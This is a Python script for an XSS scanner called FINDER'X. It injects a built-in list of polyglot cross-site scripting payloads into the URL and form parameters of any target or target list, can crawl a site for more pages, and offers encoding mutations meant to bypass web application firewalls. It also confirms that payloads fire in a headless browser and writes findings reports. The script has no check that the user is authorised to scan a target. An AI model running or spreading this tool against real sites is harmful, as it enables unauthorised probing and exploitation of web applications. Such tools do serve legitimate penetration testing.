#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FINDER’X v2.1.4 — ULTIMATE EDITION
Author: INTELEON404 — 2025
"""

import asyncio
import aiohttp
import urllib.parse
import random
import string
import sys
import argparse
import os
import signal
import threading
import time
import platform
import html
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from bs4 import BeautifulSoup
from datetime import datetime

# ==========================================
# [ CONFIGURATION & STYLING ]
# ==========================================

# ANSI COLORS
R = "\033[0m"       
W = "\033[1;37m"    
B = "\033[1;34m"    
G = "\033[1;32m"    
Y = "\033[1;33m"    
RR = "\033[1;31m"  
C = "\033[1;36m"    
M = "\033[1;35m"    
GR = "\033[1;30m"   

VERSION = "2.3.1"

# Professional ASCII Banner
BANNER = f"""
{W} ──────▄▀▄─────▄▀▄      {RR}F I N D E R ' X
{W} ─────▄█░░▀▀▀▀▀░░█▄     {GR}v{VERSION} ULTIMATE EDITION
{W} ─▄▄──█░░░░░░░░░░░█──▄▄ {W}-----------------------
{W} █▄▄█─█░░▀░░┬░░▀░░█─█▄▄█ {Y}By{RR} INTELEON404
"""
class Log:
    """Handles professional CLI logging."""
    @staticmethod
    def info(msg):
        print(f"{B}[INF]{R} {msg}")

    @staticmethod
    def warn(msg):
        print(f"{Y}[WRN]{R} {msg}")

    @staticmethod
    def error(msg):
        print(f"{RR}[ERR]{R} {msg}")

    @staticmethod
    def success(msg):
        print(f"{G}[SUC]{R} {msg}")

    @staticmethod
    def vuln(severity, url, param, payload):
        color = RR if severity == "HIGH" else Y
        print(f"\n{color}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}")
        print(f"{color}[⚡] VULNERABILITY DETECTED ({severity}){R}")
        print(f"{W}    ├── Param   :{R} {param}")
        print(f"{W}    ├── Payload :{R} {payload}")
        print(f"{W}    └── URL     :{R} {url}")
        print(f"{color}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}\n")

    @staticmethod
    def debug(msg):
        # Only if needed
        pass

# ==========================================
# [ CORE LOGIC ]
# ==========================================

# ADVANCED POLYGLOTS & CONTEXT BREAKERS (DalFox Style)
DEFAULT_PAYLOADS = [
    # 1. Standard Polyglot (Breaks attributes, script tags, html)
    "\"><script>alert('FINDERX')</script>",
    "'><script>alert('FINDERX')</script>",
    "<script>javascript:alert(1)</script>",
    
    # 2. Attribute Breakout
    "\" onmouseover=alert('FINDERX') \"",
    "' onmouseover=alert('FINDERX') '",
    "\" autofocus onfocus=alert('FINDERX') \"",
    
    # 3. Script Context Breakout
    "'-alert('FINDERX')-'",
    "\";alert('FINDERX');//",
    "\\';alert('FINDERX');//",
    
    # 4. Protocol Injection
    "javascript:alert('FINDERX')",
    
    # 5. Tag Specific (Img, Svg, Details)
    "<img src=x onerror=alert('FINDERX')>",
    "<svg/onload=alert('FINDERX')>",
    "<details/open/ontoggle=alert('FINDERX')>",
    "<body onload=alert('FINDERX')>",
    
    # 6. Advanced/Obfuscated (Good for WAFs)
    "<svg><script>alert('FINDERX')</script>",
    "\"><svg/onload=alert('FINDERX')>",
    "<iframe src=\"javascript:alert('FINDERX')\">",
    "<math><mtext><table><mglyph><style><!--</style><img title=\"<img src=x onerror=alert('FINDERX')>\">",
]

class FinderX:
    def __init__(self, args):
        self.args = args
        self.delay = args.delay
        self.proxy = args.proxy
        self.verify = args.verify
        self.waf_bypass = args.waf_bypass
        self.results = []
        self.results_lock = threading.Lock()
        self.payloads = self.load_payloads()
        self.stop_event = threading.Event()
        self.start_time = time.time()
        self.request_count = 0

        # Load targets
        self.targets = []
        if args.file:
            filename = args.file
            if not os.path.exists(filename):
                Log.error(f"File not found: {filename}")
                sys.exit(1)
            try:
                with open(filename, 'r', encoding='utf-8') as f:
                    self.targets = [l.strip() for l in f if l.strip() and not l.startswith("#")]
                Log.success(f"Loaded {len(self.targets)} targets from {filename}")
            except Exception as e:
                Log.error(f"File error: {e}")
                sys.exit(1)
        elif args.url:
            self.targets = [args.url.rstrip('&')]
        else:
            Log.error("Usage: python3 finderx.py -u <url> OR -f <file>")
            sys.exit(1)

        os.makedirs("Results", exist_ok=True)
        
        # Start auto-save thread
        self.save_thread = threading.Thread(target=self.auto_save, daemon=True)
        self.save_thread.start()
        
        # Signal handling
        signal.signal(signal.SIGINT, self.exit_gracefully)
        signal.signal(signal.SIGTERM, self.exit_gracefully)

    def load_payloads(self):
        if self.args.payloads:
            try:
                if not os.path.exists(self.args.payloads):
                    Log.warn("Payload file not found, using defaults.")
                    return DEFAULT_PAYLOADS
                with open(self.args.payloads, 'r', encoding='utf-8') as f:
                    p = [l.strip() for l in f if l.strip() and not l.startswith("#")]
                Log.info(f"Loaded {len(p)} custom payloads")
                return p
            except Exception as e:
                Log.error(f"Error loading payloads: {e}")
        return DEFAULT_PAYLOADS

    def print_config(self):
        print(f"{GR}┌──────────────────────────────────────────────┐{R}")
        print(f"{GR}│ {W}Target Count :{R} {str(len(self.targets)).ljust(29)} {GR}│{R}")
        print(f"{GR}│ {W}Concurrency  :{R} {str(75).ljust(29)} {GR}│{R}")  
        print(f"{GR}│ {W}Delay        :{R} {str(self.delay).ljust(29)} {GR}│{R}")
        print(f"{GR}│ {W}WAF Bypass   :{R} {str(self.waf_bypass).ljust(29)} {GR}│{R}")
        print(f"{GR}│ {W}Verify Mode  :{R} {str(self.verify).ljust(29)} {GR}│{R}")
        print(f"{GR}└──────────────────────────────────────────────┘{R}\n")

    def exit_gracefully(self, *args):
        duration = time.time() - self.start_time
        print(f"\n{C}──────────────────────────────────────────────{R}")
        Log.info(f"Scan finished in {duration:.2f}s")
        Log.info(f"Total Requests: {self.request_count}")
        Log.warn("Saving final reports...")
        
        self.stop_event.set()
        self.save_all_reports()
        
        Log.success("All reports saved in Results/ folder")
        os._exit(0)

    def auto_save(self):
        while not self.stop_event.is_set():
            time.sleep(10)
            if self.results:
                self.save_all_reports(silent=True)

    def html_escape(self, s):
        return html.escape(s)

    def build_url(self, base, param, value):
        parsed = urlparse(base)
        q = parse_qs(parsed.query)
        q[param] = [value]
        # Use safe string for quotes/brackets if possible, but servers might require encoding
        return parsed._replace(query=urlencode(q, doseq=True)).geturl()

    def get_payloads(self):
        if not self.waf_bypass:
            return self.payloads
        extra = []
        for p in self.payloads:
            # 1. URL Encode
            extra.append(urllib.parse.quote(p))
            # 2. Double URL Encode
            extra.append(urllib.parse.quote(urllib.parse.quote(p)))
            # 3. Confirm/Prompt Mutations
            extra.append(p.replace("alert", "confirm"))
            extra.append(p.replace("alert", "prompt"))
        return list(set(self.payloads + extra))

    async def start(self):
        print(BANNER)
        self.print_config()
        
        # Increased limit for "DalFox" speed
        connector = aiohttp.TCPConnector(limit=75, ssl=False)
        timeout = aiohttp.ClientTimeout(total=25, connect=10)
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        }

        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers) as session:
                for target in self.targets:
                    Log.info(f"Scanning target: {W}{target}{R}")
                    if self.args.crawl:
                        await self.crawl_and_scan(session, target)
                    else:
                        await self.test_url(session, target)
        except Exception as e:
            Log.error(f"Session error: {e}")
        finally:
            self.exit_gracefully()

    async def test_url(self, session, url):
        try:
            async with session.get(url, proxy=self.proxy) as resp:
                self.request_count += 1
                if resp.status != 200: 
                    return
                text = await resp.text(errors='ignore')
                soup = BeautifulSoup(text, 'html.parser')

            params = set(parse_qs(urlparse(url).query).keys())
            for tag in soup.find_all(["input", "textarea", "select"]):
                if name := tag.get("name"):
                    params.add(name)
            
            if not params:
                params = {"q", "search", "query", "id", "s", "keyword", "p", "callback", "redirect"}

            for param in params:
                # Use semaphore or batching here if needed for massive scans
                for payload in self.get_payloads():
                    await self.inject(session, url, param, payload)
        except asyncio.TimeoutError:
            pass 
        except Exception:
            pass

    async def inject(self, session, base_url, param, payload):
        # Smarter Marker Injection
        marker = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        
        if "FINDERX" in payload:
            final_payload = payload.replace("FINDERX", marker)
        elif "alert" in payload:
            # Try to inject marker into alert functions if FINDERX tag missing
            final_payload = payload.replace("alert('XSS')", f"alert('{marker}')")
            final_payload = final_payload.replace("alert(1)", f"alert('{marker}')")
        else:
            if payload.lower().startswith("javascript:"):
                final_payload = payload 
            else:
                final_payload = payload + f"<!--{marker}-->"
            
        test_url = self.build_url(base_url, param, final_payload)

        try:
            async with session.get(test_url, proxy=self.proxy) as resp:
                self.request_count += 1
                text = await resp.text(errors='ignore')
                
                is_reflected = False
                
                # Loose matching first, then verify
                if marker in text:
                    is_reflected = True
                elif payload.split('alert')[0] in text: # Check structure reflection
                    is_reflected = True
                
                if is_reflected:
                    status = "Reflection Found"
                    severity = "MEDIUM"
                    
                    if self.verify:
                        status = await self.browser_verify(test_url)
                        if "VERIFIED" in status:
                            severity = "HIGH"
                    
                    Log.vuln(severity, test_url, param, final_payload)

                    domain = urlparse(test_url).netloc.lower().removeprefix("www.")
                    
                    with self.results_lock:
                        self.results.append({
                            "domain": domain,
                            "url": test_url,
                            "param": param,
                            "payload": final_payload,
                            "status": status,
                            "severity": severity,
                            "time": datetime.now().strftime("%H:%M:%S")
                        })
                    
                    if severity == "HIGH":
                        self.save_all_reports(silent=True)
                        
        except Exception:
            pass
        
        await asyncio.sleep(self.delay)

    async def browser_verify(self, url):
        try:
            from playwright.async_api import async_playwright
        except ImportError:
            return "Reflection (Playwright Missing)"

        try:
            async with async_playwright() as p:
                # More robust browser context for modern web apps
                browser = await p.chromium.launch(headless=True, args=['--no-sandbox', '--disable-xss-auditor'])
                context = await browser.new_context(
                    ignore_https_errors=True, 
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                )
                page = await context.new_page()
                alerted = False
                
                async def handle_dialog(dialog):
                    nonlocal alerted
                    alerted = True
                    # Log.debug(f"Dialog Fired: {dialog.message}") 
                    try:
                        await dialog.accept() 
                    except:
                        await dialog.dismiss()

                page.on("dialog", handle_dialog)
                try:
                    # Increased wait time for heavy JS apps
                    await page.goto(url, timeout=15000, wait_until="domcontentloaded")
                    await page.wait_for_timeout(2000) 
                except Exception:
                    pass
                await browser.close()
                return "VERIFIED (Alert Fired)" if alerted else "Reflection Only"
        except Exception as e:
            return f"Verify Error: {str(e)[:15]}"

    async def crawl_and_scan(self, session, start_url):
        visited = set()
        queue = [start_url]
        base_domain = urlparse(start_url).netloc
        
        Log.info("Starting recursive crawler...")
        
        while queue and len(visited) < 60: # Limit depth
            url = queue.pop(0)
            if url in visited: continue
            visited.add(url)
            
            sys.stdout.write(f"\r{GR}[crawler] Visiting: {url[:60].ljust(60)}{R}")
            sys.stdout.flush()
            
            await self.test_url(session, url)
            
            try:
                async with session.get(url, proxy=self.proxy, timeout=5) as r:
                    if "text/html" not in r.headers.get("content-type", ""): continue
                    text = await r.text(errors='ignore')
                    soup = BeautifulSoup(text, 'html.parser')
                    
                    for a in soup.find_all("a", href=True):
                        link = urljoin(url, a["href"]).split("#")[0]
                        link_parsed = urlparse(link)
                        
                        if link_parsed.netloc == base_domain:
                            if not any(ext in link for ext in ['.jpg', '.png', '.css', '.js', '.pdf', '.gif', '.svg']):
                                if link not in visited and link not in queue:
                                    queue.append(link)
            except Exception:
                pass
        print() 

    def save_all_reports(self, silent=False):
        with self.results_lock:
            if not self.results: return
            current_results = list(self.results)

        domains = set(r["domain"] for r in current_results)
        
        for domain in domains:
            findings = [r for r in current_results if r["domain"] == domain]
            if not findings: continue
            
            filename_base = f"Results/{domain}_report"
            self.generate_html_report(domain, findings, filename_base + ".html")
            self.generate_txt_report(domain, findings, filename_base + ".txt")

            if not silent:
                Log.success(f"Report updated: {filename_base}.html")

    def generate_html_report(self, domain, findings, filepath):
        # Modern Dashboard Template
        high_count = sum(1 for r in findings if r['severity'] == "HIGH")
        med_count = sum(1 for r in findings if r['severity'] == "MEDIUM")
        
        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Finder'X Report - {domain}</title>
    <style>
        :root {{ --bg: #0d1117; --card: #161b22; --border: #30363d; --text: #c9d1d9; --accent: #58a6ff; --high: #ff7b72; --med: #d29922; }}
        body {{ background-color: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; margin: 0; padding: 20px; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        .header {{ display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); padding-bottom: 20px; margin-bottom: 30px; }}
        .logo {{ font-size: 1.5rem; font-weight: bold; color: var(--accent); }}
        .stats {{ display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin-bottom: 30px; }}
        .card {{ background: var(--card); border: 1px solid var(--border); border-radius: 6px; padding: 20px; }}
        .card h3 {{ margin: 0 0 10px 0; font-size: 0.9rem; color: #8b949e; }}
        .card .number {{ font-size: 2rem; font-weight: bold; }}
        table {{ width: 100%; border-collapse: collapse; background: var(--card); border-radius: 6px; overflow: hidden; }}
        th, td {{ text-align: left; padding: 12px 15px; border-bottom: 1px solid var(--border); }}
        th {{ background: #21262d; color: #f0f6fc; font-weight: 600; }}
        .badge {{ padding: 2px 8px; border-radius: 12px; font-size: 0.8rem; font-weight: 600; }}
        .badge.HIGH {{ background: rgba(255, 123, 114, 0.15); color: var(--high); border: 1px solid rgba(255, 123, 114, 0.4); }}
        .badge.MEDIUM {{ background: rgba(210, 153, 34, 0.15); color: var(--med); border: 1px solid rgba(210, 153, 34, 0.4); }}
        .code-block {{ background: #0d1117; padding: 8px; border-radius: 4px; font-family: monospace; font-size: 0.85rem; color: #a5d6ff; border: 1px solid var(--border); word-break: break-all; }}
        .btn {{ display: inline-block; padding: 5px 10px; background: var(--accent); color: #fff; text-decoration: none; border-radius: 4px; font-size: 0.85rem; font-weight: 500; cursor: pointer; }}
        .btn:hover {{ opacity: 0.9; }}
        a {{ color: var(--accent); text-decoration: none; }}
        a:hover {{ text-decoration: underline; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">FINDER'X <span style="font-size:0.8em; color:#8b949e">ULTIMATE v{VERSION}</span></div>
            <div style="color: #8b949e">{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div>
        </div>

        <div class="stats">
            <div class="card">
                <h3>Total Findings</h3>
                <div class="number">{len(findings)}</div>
            </div>
            <div class="card" style="border-top: 3px solid var(--high)">
                <h3>High Severity</h3>
                <div class="number" style="color: var(--high)">{high_count}</div>
            </div>
            <div class="card" style="border-top: 3px solid var(--med)">
                <h3>Medium Severity</h3>
                <div class="number" style="color: var(--med)">{med_count}</div>
            </div>
        </div>

        <table>
            <thead>
                <tr>
                    <th style="width: 50px">#</th>
                    <th style="width: 100px">Severity</th>
                    <th style="width: 120px">Param</th>
                    <th>Payload & Context</th>
                    <th style="width: 150px">Status</th>
                    <th style="width: 100px">Action</th>
                </tr>
            </thead>
            <tbody>"""

        for i, r in enumerate(findings, 1):
            safe_payload = self.html_escape(r["payload"])
            safe_url = self.html_escape(r['url'])
            
            html += f"""
                <tr>
                    <td>{i}</td>
                    <td><span class="badge {r['severity']}">{r['severity']}</span></td>
                    <td><code>{r['param']}</code></td>
                    <td>
                        <div style="margin-bottom:5px; font-size:0.85rem"><a href="{safe_url}" target="_blank" rel="noopener noreferrer">{safe_url[:70]}...</a></div>
                        <div class="code-block">{safe_payload}</div>
                    </td>
                    <td>{r['status']}</td>
                    <td><a href="{safe_url}" target="_blank" rel="noopener noreferrer" class="btn">Test PoC</a></td>
                </tr>"""

        html += """
            </tbody>
        </table>
        <div style="text-align: center; margin-top: 40px; color: #8b949e; font-size: 0.8rem;">
            Generated by Finder'X Ultimate - Automated Security Scanner
        </div>
    </div>
</body>
</html>"""
        
        try:
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(html)
        except Exception as e:
            Log.error(f"Error writing HTML: {e}")

    def generate_txt_report(self, domain, findings, filepath):
        try:
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(f"FINDER'X v{VERSION} - SECURITY REPORT\n")
                f.write(f"Target: {domain}\n")
                f.write(f"Date:   {datetime.now()}\n")
                f.write("="*70 + "\n\n")
                for i, r in enumerate(findings, 1):
                    f.write(f"[{i}] SEVERITY: {r['severity']}\n")
                    f.write(f"    Param:   {r['param']}\n")
                    f.write(f"    Payload: {r['payload']}\n")
                    f.write(f"    URL:     {r['url']}\n")
                    f.write(f"    Status:  {r['status']}\n")
                    f.write("-" * 70 + "\n")
        except Exception as e:
            Log.error(f"Error writing TXT: {e}")

async def main():
    parser = argparse.ArgumentParser(description=f"FINDER’X v{VERSION}")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Single target URL")
    group.add_argument("-f", "--file", help="File containing list of URLs")
    group.add_argument("-l", "--list", dest="file", help="Alias for -f")
    
    parser.add_argument("-p", "--payloads", help="Custom payloads file")
    parser.add_argument("--crawl", action="store_true", help="Enable crawling")
    parser.add_argument("--delay", type=float, default=0.2, help="Delay between requests")
    parser.add_argument("--proxy", help="HTTP Proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--verify", action="store_true", help="Verify XSS with Headless Browser")
    parser.add_argument("--waf-bypass", action="store_true", help="Try WAF bypass payloads")
    
    args = parser.parse_args()

    scanner = FinderX(args)
    await scanner.start()

if __name__ == "__main__":
    if platform.system() == 'Windows':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit(0)